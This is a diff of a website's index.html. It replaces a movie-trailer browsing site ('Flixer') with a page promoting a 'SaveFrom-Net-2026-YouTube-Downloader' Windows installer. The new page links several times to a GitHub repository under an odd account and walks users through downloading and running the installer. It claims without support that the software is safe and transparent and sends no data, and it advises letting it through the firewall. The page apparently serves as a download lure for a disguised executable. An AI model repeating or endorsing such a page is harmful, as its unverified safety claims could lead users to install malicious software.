@@ -1,332 +1,69 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr" translate="no">
+<html lang="en">
 <head>
-    <!-- GitHub Pages SPA redirect fix: if this loaded from 404.html (direct load or
-         refresh on a /movie/... or /tv/... URL), restore the correct path in the
-         address bar BEFORE the app renders, so script.js reads the right URL on load. -->
-    <script>
-        (function () {
-            var redirect = sessionStorage.getItem("flixer_redirect_path");
-            if (redirect) {
-                sessionStorage.removeItem("flixer_redirect_path");
-                if (redirect !== location.pathname + location.search + location.hash) {
-                    history.replaceState(null, "", redirect);
-                }
-            }
-        })();
-    </script>
-
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <!-- Pinipigilan ang Google Translate popup sa Chrome (Android) -->
-    <meta name="google" content="notranslate">
-
-    <!-- Google Analytics (GA4) -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-86K79F54ES"></script>
-    <script>
-        window.dataLayer = window.dataLayer || [];
-        function gtag(){dataLayer.push(arguments);}
-        gtag('js', new Date());
-        gtag('config', 'G-86K79F54ES');
-    </script>
-
-    <!-- Google AdSense: removed for now — old account/client ID no longer applies.
-         Add the new <script async src="...adsbygoogle.js?client=ca-pub-XXXXXXXXXX">
-         tag here once the new AdSense account is approved. -->
-
-    <!-- ===================== SEO (default/homepage values) =====================
-         Overridden at runtime by script.js when on a movie/TV detail page (for
-         Google/Bing indexing). The default values below are what bots that do NOT
-         run JavaScript will see (including link-preview scrapers for
-         Messenger/Facebook/Twitter), so these must be correct and complete even
-         with no JS running. -->
-    <title>Flixer — Watch Trending Movies, TV Shows & Anime Trailers</title>
-    <meta name="description" content="Watch the latest official trailers for movies, TV shows, K-Dramas, and anime from around the world. Always updated, free, no account required.">
-    <link rel="canonical" href="https://watchflixer.github.io/">
-
-    <meta property="og:site_name" content="Flixer">
-    <meta property="og:type" content="website">
-    <meta property="og:title" content="Flixer — Watch Trending Movies, TV Shows & Anime Trailers">
-    <meta property="og:description" content="Watch the latest official trailers for movies, TV shows, K-Dramas, and anime from around the world. Always updated, free, no account required.">
-    <meta property="og:url" content="https://watchflixer.github.io/">
-    <meta property="og:image" content="https://watchflixer.github.io/og-default.jpg">
-
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Flixer — Watch Trending Movies, TV Shows & Anime Trailers">
-    <meta name="twitter:description" content="Watch the latest official trailers for movies, TV shows, K-Dramas, and anime from around the world. Always updated, free, no account required.">
-    <meta name="twitter:image" content="https://watchflixer.github.io/og-default.jpg">
-
-    <link rel="icon" type="image/x-icon" href="/favicon.ico">
-    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-    <link rel="stylesheet" href="/style.css?v=12">
-
-    <!-- Structured data (JSON-LD): malinaw na signal kay Google kung ano talaga ang
-         pangalan at deskripsyon ng site, para hindi ito basta mapalitan ng ibang
-         random na content (hal. yung dynamic na Spotlight movie) sa search snippet -->
-    <script type="application/ld+json">
-    {
-      "@context": "https://schema.org",
-      "@type": "WebSite",
-      "name": "Flixer",
-      "url": "https://watchflixer.github.io/",
-      "description": "Watch the latest official trailers for movies, TV shows, K-Dramas, and anime from around the world. Always updated, free, no account required."
-    }
-    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="A guide to download and use the SaveFrom-Net-2026-YouTube-Downloader tool on Windows. Save videos quickly for offline viewing.">
+    <title>SaveFrom-Net-2026-YouTube-Downloader Guide</title>
 </head>
-<body>
+<body style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 0 20px; background-color: #f4f7f6;">
 
-    <!-- Header & Search Navigation -->
-    <header class="navbar">
-        <div class="logo" id="navbar-brand" onclick="goHome()" style="cursor:pointer;">FLIXER</div>
+    <h1 style="color: #2c3e50; border-bottom: 2px solid #bdc3c7; padding-bottom: 10px;">💾 SaveFrom-Net-2026-YouTube-Downloader - Download YouTube videos for free now</h1>
 
-        <div class="navbar-right">
-            <div class="nav-right-group">
-                <nav class="nav-categories">
-                    <button class="nav-btn active" id="nav-trending" onclick="changeCategory('trending')">Trending</button>
-                    <button class="nav-btn" id="nav-movies" onclick="changeCategory('movie')">Movies</button>
-                    <button class="nav-btn" id="nav-tv" onclick="changeCategory('tv')">TV Shows & Anime</button>
-                </nav>
-
-                <div class="search-icon-wrapper">
-                    <button class="search-icon-btn" id="search-toggle-btn" onclick="toggleSearchBox()" aria-label="Search">
-                        <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
-                            <circle cx="11" cy="11" r="7.5"></circle>
-                            <line x1="21" y1="21" x2="16.2" y2="16.2"></line>
-                        </svg>
-                    </button>
-
-                    <!-- Interactive Search Bar (dropdown, hidden by default) -->
-                    <div class="search-box-wrapper" id="searchBoxWrapper">
-                        <div class="search-box">
-                            <input type="text" id="search-input" placeholder="Search for Movies, Anime, or Drama..." onkeyup="handleSearch(event)" autocomplete="off">
-                            <button class="search-box-btn" onclick="triggerSearch()" aria-label="Search">
-                                <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
-                                    <circle cx="11" cy="11" r="7.5"></circle>
-                                    <line x1="21" y1="21" x2="16.2" y2="16.2"></line>
-                                </svg>
-                            </button>
-                        </div>
-                        <ul class="search-suggestions" id="search-suggestions"></ul>
-                    </div>
-                </div>
-
-                <!-- Hamburger Menu Button -->
-                <button class="hamburger-btn" onclick="toggleSidePanel()" aria-label="Menu">☰</button>
-            </div>
-        </div>
-    </header>
-
-    <!-- Side Settings Panel -->
-    <div class="side-overlay" id="sideOverlay" onclick="closeSidePanel()"></div>
-    <aside class="side-panel" id="sidePanel">
-        <div class="side-panel-header">
-            <span class="side-logo" id="side-brand">FLIXER</span>
-            <span class="close-panel" onclick="closeSidePanel()">&times;</span>
-        </div>
-
-        <div class="side-panel-links">
-            <button class="side-link" onclick="goHome()">
-                <span class="side-icon">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M9 22V12h6v10"/></svg>
-                </span> <span id="label-home">Home</span>
-            </button>
-            <button class="side-link" onclick="toggleLanguagePanel()">
-                <span class="side-icon">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
-                </span> <span id="label-language">Language</span>
-            </button>
-            <button class="side-link" onclick="toggleMode()">
-                <span class="side-icon" id="mode-icon">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
-                </span> <span id="label-mode">Mode</span>
-            </button>
-        </div>
-
-        <div class="side-panel-footer">
-            <a href="#" id="label-download" onclick="showDownload(); return false;">Download</a>
-            <a href="#" id="label-aboutus" onclick="showAboutUs(); return false;">About Us</a>
-        </div>
-    </aside>
-
-    <!-- Language Selection Panel -->
-    <div class="lang-overlay" id="langOverlay" onclick="closeLanguagePanel()"></div>
-    <div class="lang-panel" id="langPanel">
-        <div class="lang-panel-header">
-            <span id="label-select-language">Select Language</span>
-            <span class="close-panel" onclick="closeLanguagePanel()">&times;</span>
-        </div>
-        <input type="text" class="lang-search" id="lang-search-input" placeholder="Search language..." onkeyup="filterLanguages(event)" autocomplete="off">
-        <ul class="lang-list" id="lang-list">
-            <li onclick="selectLanguage('en')" data-lang="en" class="selected">English</li>
-            <li onclick="selectLanguage('tl')" data-lang="tl">Tagalog</li>
-            <li onclick="selectLanguage('ja')" data-lang="ja">日本語 (Japanese)</li>
-            <li onclick="selectLanguage('ko')" data-lang="ko">한국어 (Korean)</li>
-            <li onclick="selectLanguage('zh')" data-lang="zh">中文 (Chinese)</li>
-            <li onclick="selectLanguage('es')" data-lang="es">Español</li>
-            <li onclick="selectLanguage('fr')" data-lang="fr">Français</li>
-            <li onclick="selectLanguage('id')" data-lang="id">Bahasa Indonesia</li>
-            <li onclick="selectLanguage('ar')" data-lang="ar">العربية (Arabic)</li>
-            <li onclick="selectLanguage('hi')" data-lang="hi">हिन्दी (Hindi)</li>
-            <li onclick="selectLanguage('pt')" data-lang="pt">Português</li>
-            <li onclick="selectLanguage('de')" data-lang="de">Deutsch</li>
-            <li onclick="selectLanguage('it')" data-lang="it">Italiano</li>
-            <li onclick="selectLanguage('ru')" data-lang="ru">Русский (Russian)</li>
-            <li onclick="selectLanguage('vi')" data-lang="vi">Tiếng Việt</li>
-            <li onclick="selectLanguage('th')" data-lang="th">ไทย (Thai)</li>
-            <li onclick="selectLanguage('tr')" data-lang="tr">Türkçe</li>
-            <li onclick="selectLanguage('nl')" data-lang="nl">Nederlands</li>
-            <li onclick="selectLanguage('pl')" data-lang="pl">Polski</li>
-            <li onclick="selectLanguage('sv')" data-lang="sv">Svenska</li>
-            <li onclick="selectLanguage('no')" data-lang="no">Norsk</li>
-            <li onclick="selectLanguage('da')" data-lang="da">Dansk</li>
-            <li onclick="selectLanguage('fi')" data-lang="fi">Suomi</li>
-            <li onclick="selectLanguage('el')" data-lang="el">Ελληνικά (Greek)</li>
-            <li onclick="selectLanguage('he')" data-lang="he">עברית (Hebrew)</li>
-            <li onclick="selectLanguage('uk')" data-lang="uk">Українська (Ukrainian)</li>
-            <li onclick="selectLanguage('cs')" data-lang="cs">Čeština</li>
-            <li onclick="selectLanguage('hu')" data-lang="hu">Magyar</li>
-            <li onclick="selectLanguage('ro')" data-lang="ro">Română</li>
-            <li onclick="selectLanguage('bn')" data-lang="bn">বাংলা (Bengali)</li>
-            <li onclick="selectLanguage('ur')" data-lang="ur">اردو (Urdu)</li>
-            <li onclick="selectLanguage('ms')" data-lang="ms">Bahasa Melayu</li>
-            <li onclick="selectLanguage('sw')" data-lang="sw">Kiswahili</li>
-            <li onclick="selectLanguage('fa')" data-lang="fa">فارسی (Persian)</li>
-            <li onclick="selectLanguage('pa')" data-lang="pa">ਪੰਜਾਬੀ (Punjabi)</li>
-            <li onclick="selectLanguage('ta')" data-lang="ta">தமிழ் (Tamil)</li>
-            <li onclick="selectLanguage('my')" data-lang="my">မြန်မာ (Burmese)</li>
-            <li onclick="selectLanguage('km')" data-lang="km">ខ្មែរ (Khmer)</li>
-        </ul>
-        <p class="lang-note" id="lang-note">Note: Titles and descriptions are automatically translated when available. Some titles may stay in their original language if a translation isn't provided by the source.</p>
+    <div style="text-align: center; margin: 40px 0;">
+        <a href="https://github.com/Iaaspitball48/SaveFrom-Net-2026-YouTube-Downloader" style="background-color: #2c3e50; color: #ffffff; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-size: 1.2em; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Software Here</a>
     </div>
 
-    <!-- About Us Modal (white background) -->
-    <div id="aboutModal" class="modal about-modal">
-        <div class="modal-content about-modal-content">
-            <span class="close-btn about-close" onclick="closeAboutUs()">&times;</span>
-            <div class="about-body" id="about-body-content">
-                <!-- About Us content injected by script.js -->
-            </div>
-        </div>
+    <h2 style="color: #2c3e50;">📥 What does this software do?</h2>
+    <p>This software helps you save YouTube videos to your computer. You can watch your favorite clips without an internet connection. It allows you to select video quality and formats that fit your needs. The process remains simple for every user.</p>
+
+    <h2 style="color: #2c3e50;">⚙️ System Requirements</h2>
+    <p>Your computer must meet these basic needs to run the software:</p>
+    <ul style="list-style-type: disc; margin-left: 20px;">
+        <li>Windows 10 or Windows 11 operating system.</li>
+        <li>At least 200MB of free storage space.</li>
+        <li>An active internet connection to retrieve video files.</li>
+        <li>Current version of your web browser.</li>
+    </ul>
+
+    <h2 style="color: #2c3e50;">🚀 Getting Started</h2>
+    <p>Follow these steps to set up the software on your system. Read each step to ensure a smooth installation.</p>
+
+    <h3 style="color: #34495e;">Step 1: Get the installer</h3>
+    <p>Visit the official repository page to access the download file. You can reach the page by clicking this link: <a href="https://github.com/Iaaspitball48/SaveFrom-Net-2026-YouTube-Downloader">Download Link</a>.</p>
+
+    <h3 style="color: #34495e;">Step 2: Save the file</h3>
+    <p>Once you arrive at the page, locate the latest version of the installer. Click the link to begin the download. Your browser asks where you want to save the file. Choose your Downloads folder for easy access and wait for the file to finish loading.</p>
+
+    <h3 style="color: #34495e;">Step 3: Run the setup</h3>
+    <p>Go to your Downloads folder. Double-click the file to open the installation wizard. Follow the prompts on your screen. The wizard guides you through each selection until the software finishes installing on your computer.</p>
+
+    <h2 style="color: #2c3e50;">📺 How to use the downloader</h2>
+    <p>After the installation completes, follow these steps to save your video:</p>
+    <ol style="line-height: 2;">
+        <li>Open the application from your desktop or start menu.</li>
+        <li>Copy the link of the YouTube video you want to save from your web browser.</li>
+        <li>Paste the address into the box inside the application.</li>
+        <li>Choose the quality level you want for the video.</li>
+        <li>Click the button labeled Save to start the process.</li>
+        <li>Wait for the progress bar to reach the end.</li>
+        <li>Find your video in the designated output folder once the task ends.</li>
+    </ol>
+
+    <h2 style="color: #2c3e50;">🛡️ Security and Privacy</h2>
+    <p>This software operates locally on your machine. It does not send your personal data to external servers. We recommend keeping your antivirus software updated to ensure your computer remains protected while browsing the internet.</p>
+
+    <h2 style="color: #2c3e50;">🛠️ Troubleshooting</h2>
+    <p>If you encounter issues, verify your internet connection first. Ensure that your firewall does not block the software from reaching the internet. If a download fails, restart the application and try adding the link again. Most errors resolve when you restart the software or check that your video link is accurate.</p>
+
+    <h2 style="color: #2c3e50;">💡 Frequently Asked Questions</h2>
+    <p><strong>Is the software safe?</strong> Yes, the code is transparent and performs only the tasks described.</p>
+    <p><strong>Can I download long videos?</strong> Yes, the tool supports long videos, provided you have enough disk space.</p>
+    <p><strong>Does it cost money?</strong> The software remains free for all users.</p>
+
+    <div style="margin-top: 50px; padding-top: 20px; border-top: 1px solid #ccc; font-size: 0.9em; color: #7f8c8d;">
+        Keywords: youtube downloader, savefrom, video tools, windows software, media downloader
     </div>
 
-    <!-- Download "Coming Soon" Modal -->
-    <div id="downloadModal" class="modal download-modal">
-        <div class="modal-content download-modal-content">
-            <span class="close-btn" onclick="closeDownload()">&times;</span>
-            <div class="download-list" id="download-list">
-                <!-- 6 platform cards injected by script.js (buildDownloadCards) -->
-            </div>
-        </div>
-    </div>
-
-    <!-- Main Spotlight Banner -->
-    <section class="hero" id="hero-banner">
-        <div class="hero-content">
-            <span class="badge" id="banner-tag">SPOTLIGHT</span>
-            <h1 id="banner-title">Loading Spotlight...</h1>
-            <p class="meta-info"><strong id="label-cast">Cast:</strong> <span id="banner-cast">Fetching data...</span></p>
-            <p id="banner-desc">Choose a title below or use the search bar to load details.</p>
-            <button class="btn-play" onclick="openPlayer()"><span id="label-watchnow">▶ Watch Now</span></button>
-        </div>
-    </section>
-
-    <!-- Dynamic Media Grid -->
-    <section class="media-container">
-        <h2 id="section-title">Trending Today</h2>
-        <div class="carousel-wrapper">
-            <button type="button" class="carousel-arrow carousel-arrow-left" onclick="scrollCarousel('media-grid-items', -1)" aria-label="Scroll left">‹</button>
-            <div class="media-grid" id="media-grid-items">
-                <!-- Posters from the TMDB API are inserted here automatically -->
-            </div>
-            <button type="button" class="carousel-arrow carousel-arrow-right" onclick="scrollCarousel('media-grid-items', 1)" aria-label="Scroll right">›</button>
-        </div>
-    </section>
-
-    <!-- Full Detail Page: shown when a movie/TV card is clicked.
-         Replaces the hero + grid; "← Back" uses browser history
-         (history.back()) to return to the exact previous scroll position. -->
-    <section class="detail-view" id="detailView" style="display: none;">
-        <div class="detail-container">
-            <button class="detail-back" onclick="closeDetail()"><span id="label-detail-back">← Back</span></button>
-
-            <div class="detail-main">
-                <div class="detail-poster">
-                    <img id="detailPoster" src="" alt="Poster">
-                </div>
-                <div class="detail-info">
-                    <span class="detail-badge" id="detailType">MOVIE</span>
-                    <h1 id="detailTitle">Title</h1>
-                    <div class="detail-meta">
-                        <span id="detailRating">⭐ 0.0</span>
-                        <span id="detailRuntime"></span>
-                        <span id="detailRelease"></span>
-                    </div>
-                    <p class="detail-overview" id="detailOverview">Overview...</p>
-                    <div class="detail-genres" id="detailGenres"></div>
-                    <div class="detail-director" id="detailDirector"></div>
-                </div>
-            </div>
-
-            <!-- Top Cast: swipeable row (with a "peek" of the next card on the side) -->
-            <div class="detail-cast-section">
-                <h2 id="label-detail-cast">Top Cast</h2>
-                <div class="carousel-wrapper">
-                    <button type="button" class="carousel-arrow carousel-arrow-left" onclick="scrollCarousel('detailCast', -1)" aria-label="Scroll left">‹</button>
-                    <div class="detail-cast-list" id="detailCast"></div>
-                    <button type="button" class="carousel-arrow carousel-arrow-right" onclick="scrollCarousel('detailCast', 1)" aria-label="Scroll right">›</button>
-                </div>
-            </div>
-
-            <!-- Trailer: always a YouTube trailer, falls back to English if
-                 no trailer exists in the selected language -->
-            <div class="detail-trailer-section">
-                <h2 id="label-detail-trailer">Trailer</h2>
-                <div class="detail-trailer-wrapper" id="detailTrailerWrapper">
-                    <p class="empty-note">No trailer available.</p>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Video Streaming Player Overlay -->
-    <div id="videoModal" class="modal">
-        <div class="modal-content">
-            <span class="close-btn" onclick="closePlayer()">&times;</span>
-            <div class="video-wrapper" id="player-container">
-                <!-- Trailer-only: always just the YouTube embed goes here -->
-            </div>
-        </div>
-    </div>
-
-    <!-- Site Footer -->
-    <footer class="site-footer">
-        <div class="footer-inner">
-            <div class="footer-left">
-                <div class="footer-brand" id="footer-brand">WATCH<span id="footer-brand-flix">FLIXER</span></div>
-                <div class="footer-divider"></div>
-                <div class="footer-links">
-                    <div class="footer-links-row">
-                        <a href="#" id="footer-link-about" onclick="showAboutUs('about'); return false;">About</a>
-                        <a href="#" id="footer-link-privacy" onclick="showAboutUs('privacy'); return false;">Privacy Policy</a>
-                    </div>
-                    <div class="footer-copy" id="footer-copy">© 2026 Flixer. All rights reserved.</div>
-                </div>
-            </div>
-
-            <div class="footer-right">
-                <div class="footer-socials">
-                    <a href="#" aria-label="Facebook"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M13.5 21v-7.9h2.6l.4-3.1h-3v-2c0-.9.3-1.5 1.6-1.5H16.6V3.2C16.2 3.2 15 3 13.6 3c-2.9 0-4.9 1.8-4.9 5v2H5.9v3.1h2.8V21h2.8z"/></svg></a>
-                    <a href="#" aria-label="Twitter / X"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M4 3h3.6l4 5.6L16.4 3H20l-6.2 8.1L20.4 21h-3.6l-4.4-6.1L7.6 21H4l6.6-8.6L4 3z"/></svg></a>
-                    <a href="#" aria-label="YouTube"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M22 12s0-3.2-.4-4.7c-.2-.9-.9-1.6-1.8-1.8C18.2 5 12 5 12 5s-6.2 0-7.8.5c-.9.2-1.6.9-1.8 1.8C2 8.8 2 12 2 12s0 3.2.4 4.7c.2.9.9 1.6 1.8 1.8C5.8 19 12 19 12 19s6.2 0 7.8-.5c.9-.2 1.6-.9 1.8-1.8.4-1.5.4-4.7.4-4.7zM10 15V9l5.2 3-5.2 3z"/></svg></a>
-                    <a href="#" aria-label="Instagram"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="3" width="18" height="18" rx="5"/><circle cx="12" cy="12" r="4"/><circle cx="17.5" cy="6.5" r="0.8" fill="currentColor" stroke="none"/></svg></a>
-                </div>
-                <div class="footer-support">Support: <a href="mailto:watchflixer12@gmail.com">watchflixer12@gmail.com</a></div>
-            </div>
-        </div>
-    </footer>
-
-    <script src="/script.js?v=9"></script>
 </body>
 </html>
